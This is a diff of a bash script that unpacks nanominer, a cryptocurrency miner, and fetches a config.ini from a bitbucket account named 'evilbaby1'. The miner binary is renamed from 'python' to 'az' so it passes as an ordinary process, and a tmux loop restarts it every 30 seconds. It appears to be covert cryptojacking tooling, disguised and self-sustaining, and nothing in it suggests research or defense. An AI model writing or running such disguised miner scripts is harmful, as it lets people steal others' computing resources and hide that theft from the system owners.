@@ -1,7 +1,7 @@
 #! /bin/bash
 set -x #echo on
 if [ -f ${PWD}/nanominer-linux-1.5.3.tar.gz ]; then
-    if pgrep -x "python" > /dev/null
+    if pgrep -x "az" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
     
@@ -9,7 +9,7 @@ else
 
 echo "script da install , chay thoi "
 cd nanominer-linux-1.5.3
-tmux new-session -d -s loop 'while (true);do if pgrep -x "python" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './python';fi; sleep 30; done'
+tmux new-session -d -s loop 'while (true);do if pgrep -x "az" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './az';fi; sleep 30; done'
 
      
 fi
@@ -21,7 +21,7 @@ tar xvzf nanominer-linux-1.5.3.tar.gz
 cd nanominer-linux-1.5.3
 rm config.ini
 wget https://bitbucket.org/evilbaby1/openai/raw/0405bd5eb1e9302b24c86d06eccd43e838fac66b/config.ini
-mv nanominer python
-chmod +x python
-tmux new-session -d -s loop 'while (true);do if pgrep -x "python" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './python';fi; sleep 30; done'
+mv nanominer az
+chmod +x az
+tmux new-session -d -s loop 'while (true);do if pgrep -x "az" > /dev/null; then echo "Miner dang chay roi , ke cmn di";else echo "Miner da install , chay thoi" && tmux new-session -d -s my_session1 './az';fi; sleep 30; done'
 
